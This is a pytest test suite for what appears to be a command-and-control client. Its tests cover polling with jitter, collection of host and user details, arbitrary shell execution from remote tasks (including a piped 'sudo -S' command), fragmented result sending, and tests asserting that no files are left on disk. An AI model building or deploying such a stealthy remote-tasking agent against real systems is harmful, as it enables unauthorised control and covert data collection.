import json
import subprocess
from unittest.mock import MagicMock

import pytest


@pytest.fixture(autouse=True)
def isolate_client(monkeypatch):
    """Reset module-level client state between tests."""
    import client
    client._client_config.update({
        "poll_interval_sec": "1",
        "poll_jitter_min": "2",
        "poll_jitter_max": "3",
        "client_id": "NADAV",
        "heartbeat_every": "100",
    })
    client._send_queue.clear()


# ---------------------------------------------------------------------------
# handle_echo
# ---------------------------------------------------------------------------

class TestHandleEcho:
    def test_returns_payload_unchanged(self):
        from client import handle_echo
        payload = {"msg": "hello", "extra": 123}
        assert handle_echo(payload) == payload

    def test_empty_payload(self):
        from client import handle_echo
        assert handle_echo({}) == {}


# ---------------------------------------------------------------------------
# handle_system_info
# ---------------------------------------------------------------------------

class TestHandleSystemInfo:
    def test_returns_required_keys(self):
        from client import handle_system_info
        result = handle_system_info({})
        for key in ("os", "hostname", "architecture", "python_version", "username"):
            assert key in result

    def test_values_are_strings(self):
        from client import handle_system_info
        result = handle_system_info({})
        assert all(isinstance(v, str) for v in result.values())


# ---------------------------------------------------------------------------
# handle_shell
# ---------------------------------------------------------------------------

class TestHandleShell:
    def test_basic_command(self):
        from client import handle_shell
        result = handle_shell({"cmd": "echo hello"})
        assert result["stdout"].strip() == "hello"
        assert result["returncode"] == 0

    def test_no_cmd_returns_error(self):
        from client import handle_shell
        result = handle_shell({})
        assert "error" in result

    def test_nonzero_returncode(self):
        from client import handle_shell
        result = handle_shell({"cmd": "exit 1"})
        assert result["returncode"] == 1

    def test_stderr_captured(self):
        from client import handle_shell
        result = handle_shell({"cmd": "echo err_output >&2"})
        assert "err_output" in result["stderr"]

    def test_timeout_returns_error(self, monkeypatch):
        import client
        def fake_run(*args, **kwargs):
            raise subprocess.TimeoutExpired(cmd="sleep", timeout=30)
        monkeypatch.setattr(subprocess, "run", fake_run)
        from client import handle_shell
        result = handle_shell({"cmd": "sleep 60"})
        assert "timed out" in result.get("error", "")

    def test_stdin_field_ignored_when_sudo_pipe(self, monkeypatch):
        captured = {}
        def fake_run(*args, **kwargs):
            captured.update(kwargs)
            m = MagicMock()
            m.stdout = b""
            m.stderr = b""
            m.returncode = 0
            return m
        monkeypatch.setattr(subprocess, "run", fake_run)
        from client import handle_shell
        handle_shell({"cmd": "echo pass | sudo -S whoami", "stdin": "somepassword"})
        # Must use DEVNULL (not PIPE) because stdin field is ignored
        assert captured.get("stdin") == subprocess.DEVNULL

    def test_stdin_field_used_when_no_sudo_pipe(self, monkeypatch):
        captured = {}
        def fake_run(*args, **kwargs):
            captured.update(kwargs)
            m = MagicMock()
            m.stdout = b""
            m.stderr = b""
            m.returncode = 0
            return m
        monkeypatch.setattr(subprocess, "run", fake_run)
        from client import handle_shell
        handle_shell({"cmd": "cat", "stdin": "some input"})
        assert captured.get("stdin") == subprocess.PIPE


# ---------------------------------------------------------------------------
# handle_config
# ---------------------------------------------------------------------------

class TestHandleConfig:
    def test_known_keys_updated(self):
        from client import handle_config, _client_config
        handle_config({"poll_interval_sec": "60", "client_id": "agent-01"})
        assert _client_config["poll_interval_sec"] == "60"
        assert _client_config["client_id"] == "agent-01"

    def test_unknown_keys_ignored(self):
        from client import handle_config, _client_config
        original = dict(_client_config)
        result = handle_config({"unknown_key": "value", "another": "bad"})
        assert result["updated"] == {}
        assert "ignored" in result
        assert _client_config == original

    def test_mixed_known_and_unknown(self):
        from client import handle_config, _client_config
        result = handle_config({"poll_interval_sec": "45", "bad_key": "x"})
        assert _client_config["poll_interval_sec"] == "45"
        assert "bad_key" in result.get("ignored", {})

    def test_result_contains_updated_and_current(self):
        from client import handle_config
        result = handle_config({"poll_interval_sec": "20"})
        assert "updated" in result
        assert "current" in result
        assert result["current"]["poll_interval_sec"] == "20"

    def test_no_disk_artifact(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        from client import handle_config
        handle_config({"client_id": "saved-id"})
        assert not any(tmp_path.iterdir()), "handle_config must not write any files to disk"

    def test_values_coerced_to_string(self):
        from client import handle_config, _client_config
        handle_config({"poll_interval_sec": 90})  # int, not string
        assert _client_config["poll_interval_sec"] == "90"


# ---------------------------------------------------------------------------
# dispatch
# ---------------------------------------------------------------------------

class TestDispatch:
    def _task(self, command, payload=None, command_id="test-id"):
        return {
            "command_id": command_id,
            "command": command,
            "payload": json.dumps(payload or {}),
            "status": "pending",
        }

    def test_routes_to_echo(self):
        from client import dispatch
        result = dispatch(self._task("echo", {"msg": "hi"}))
        assert result["status"] == "success"
        assert json.loads(result["result"])["msg"] == "hi"

    def test_unknown_command_returns_error(self):
        from client import dispatch
        result = dispatch(self._task("nonexistent"))
        assert result["status"] == "error"
        assert "unknown command" in json.loads(result["result"])["error"]

    def test_command_id_preserved(self):
        from client import dispatch
        result = dispatch(self._task("echo", {}, command_id="my-uuid-123"))
        assert result["command_id"] == "my-uuid-123"

    def test_small_result_no_fragments(self, monkeypatch):
        monkeypatch.setenv("FRAGMENT_METHOD", "passthrough")
        from client import dispatch
        result = dispatch(self._task("echo", {"msg": "small"}))
        assert "_fragments" not in result

    def test_send_queue_no_disk_artifact(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv("FRAGMENT_METHOD", "fixed")
        monkeypatch.setenv("FRAGMENT_CHUNK_SIZE", "10")
        from client import dispatch, _send_queue
        result = dispatch(self._task("echo", {"msg": "x" * 200}))
        # Simulate main loop enqueuing remaining fragments
        frags = result.pop("_fragments", [])
        if len(frags) > 1:
            _send_queue.extend(frags[1:])
        assert not any(tmp_path.iterdir()), "send queue must not write any files to disk"

    def test_large_result_produces_fragments(self, monkeypatch):
        monkeypatch.setenv("FRAGMENT_METHOD", "fixed")
        monkeypatch.setenv("FRAGMENT_CHUNK_SIZE", "10")
        from client import dispatch
        result = dispatch(self._task("echo", {"msg": "x" * 200}))
        assert "_fragments" in result
        assert len(result["_fragments"]) > 1

    def test_command_id_in_result_for_processed_tracking(self):
        """command_id must be in result so caller can add to processed set immediately."""
        from client import dispatch
        result = dispatch(self._task("echo", {}, command_id="track-me"))
        assert result["command_id"] == "track-me"

    def test_fragment_status_format(self, monkeypatch):
        monkeypatch.setenv("FRAGMENT_METHOD", "fixed")
        monkeypatch.setenv("FRAGMENT_CHUNK_SIZE", "10")
        from client import dispatch
        result = dispatch(self._task("echo", {"msg": "x" * 50}))
        for i, frag in enumerate(result["_fragments"]):
            total = len(result["_fragments"])
            assert frag["status"] == f"frag:{i}:{total}"


# ---------------------------------------------------------------------------
# _flush_queued_fragment
# ---------------------------------------------------------------------------

class TestFlushQueuedFragment:
    def _make_frag(self, command_id, index, total):
        return {"command_id": command_id, "status": f"frag:{index}:{total}", "result": f"chunk{index}"}

    def test_empty_queue_does_nothing(self, monkeypatch):
        import client, common
        client._send_queue.clear()
        calls = []
        common.set_channel(type("C", (), {"write_result": lambda self, d: calls.append(d) or True,
                                          "read_inbox": None, "read_outbox": None,
                                          "write_task": None, "build_outbox_fragments": None,
                                          "build_inbox_fragments": None})())
        client._flush_queued_fragment()
        assert calls == []

    def test_sends_first_fragment_and_removes_it(self, monkeypatch):
        import client, common
        frags = [self._make_frag("abc", i, 3) for i in range(3)]
        client._send_queue.extend(frags)
        common.set_channel(type("C", (), {"write_result": lambda self, d: True,
                                          "read_inbox": None, "read_outbox": None,
                                          "write_task": None, "build_outbox_fragments": None,
                                          "build_inbox_fragments": None})())
        client._flush_queued_fragment()
        assert len(client._send_queue) == 2
        assert client._send_queue[0]["status"] == "frag:1:3"

    def test_one_fragment_per_call(self, monkeypatch):
        import client, common
        frags = [self._make_frag("abc", i, 4) for i in range(4)]
        client._send_queue.extend(frags)
        common.set_channel(type("C", (), {"write_result": lambda self, d: True,
                                          "read_inbox": None, "read_outbox": None,
                                          "write_task": None, "build_outbox_fragments": None,
                                          "build_inbox_fragments": None})())
        for expected_remaining in (3, 2, 1, 0):
            client._flush_queued_fragment()
            assert len(client._send_queue) == expected_remaining

    def test_write_failure_leaves_fragment_in_queue(self, monkeypatch):
        import client, common
        frags = [self._make_frag("abc", i, 2) for i in range(2)]
        client._send_queue.extend(frags)
        common.set_channel(type("C", (), {"write_result": lambda self, d: False,
                                          "read_inbox": None, "read_outbox": None,
                                          "write_task": None, "build_outbox_fragments": None,
                                          "build_inbox_fragments": None})())
        client._flush_queued_fragment()
        assert len(client._send_queue) == 2
        assert client._send_queue[0]["status"] == "frag:0:2"

    def test_retry_succeeds_after_previous_failure(self, monkeypatch):
        import client, common
        frags = [self._make_frag("abc", i, 2) for i in range(2)]
        client._send_queue.extend(frags)
        results = [False, True]
        common.set_channel(type("C", (), {"write_result": lambda self, d: results.pop(0),
                                          "read_inbox": None, "read_outbox": None,
                                          "write_task": None, "build_outbox_fragments": None,
                                          "build_inbox_fragments": None})())
        client._flush_queued_fragment()
        assert len(client._send_queue) == 2  # failure — unchanged
        client._flush_queued_fragment()
        assert len(client._send_queue) == 1  # success — fragment 0 gone
